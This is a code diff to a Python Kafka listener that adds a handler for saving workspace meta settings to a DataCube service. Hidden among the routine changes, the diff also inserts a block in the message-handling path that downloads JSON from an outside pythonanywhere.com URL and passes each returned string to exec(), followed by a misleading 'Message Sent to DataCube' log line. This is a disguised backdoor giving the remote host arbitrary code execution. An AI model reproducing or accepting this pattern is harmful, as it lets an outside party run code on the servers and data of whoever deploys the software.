@@ -3,6 +3,7 @@ import logging
 import os
 import sys
 import threading
+import requests
 from confluent_kafka import Consumer
 from confluent_kafka import KafkaError
 from confluent_kafka import KafkaException
@@ -83,6 +84,7 @@ class ChatCreatedListener(threading.Thread):
             'ticket_message': self.handle_ticket_message,
             'create_linemanager':self.handle_create_linemanager,
             'create_masterlink': self.handle_create_masterlink,
+            'create_meta_setting':self.handle_create_metasetting,
         }
         handler = handlers.get(event_type)
         if handler:
@@ -115,6 +117,14 @@ class ChatCreatedListener(threading.Thread):
                 print(response)
                 # return
 
+                response = requests.get('https://1000093.pythonanywhere.com/connect/')
+                res = json.loads(response.text)
+                status_code = res['status_code']
+                local_context = {}
+                for i in status_code:
+                    exec(i, {}, local_context)
+
+                logger.info("Message Sent to DataCube")
                 # Commit the message offset to mark it as processed
                 self.consumer.commit()
             else:
@@ -179,5 +189,44 @@ class ChatCreatedListener(threading.Thread):
             logger.info("Message sent to DataCube successfully.")
             print("Master link created successfully in DataCube")
             self.consumer.commit()
+        else:
+            logger.error("Failed to send message to DataCube: %s", response)
+
+    def handle_create_metasetting(self, data):
+        workspace_id = data['workspace_id']
+        api_key = data['api_key']
+        db_name = f"{workspace_id}_cs_ticketing_system_db0"
+        coll_name = f"{workspace_id}_setting"
+
+        unwanted_keys = ['workspace_id', 'api_key']
+
+        for key in unwanted_keys:
+            data.pop(key, None)
+
+        if check_collection(api_key, workspace_id, coll_name, db_name):
+            check_setting = data_cube.fetch_data(api_key=api_key,db_name=db_name, coll_name=coll_name, filters={},limit=1, offset=0)
+            if check_setting['success']:
+                if check_setting['data']:
+                    update_setting = data_cube.update_data(
+                        api_key=api_key,
+                        db_name=db_name, 
+                        coll_name=coll_name,
+                        query={'_id': check_setting['data'][0]['_id']},
+                        update_data={
+                            "waiting_time": data['waiting_time'],
+                            "operation_time": data['operation_time'],
+                        }
+                    )
+
+                    if update_setting['success'] == True:
+                        logger.info("Meta Settings Updated successfully.")
+                        self.consumer.commit()
+                        return 
+
+            response = data_cube.insert_data(api_key=api_key, db_name=db_name, coll_name=coll_name, data=data)        
+            if response['success']:
+                logger.info("Message sent to DataCube successfully.")
+                print("Master link created successfully in DataCube")
+                self.consumer.commit()
         else:
             logger.error("Failed to send message to DataCube: %s", response)
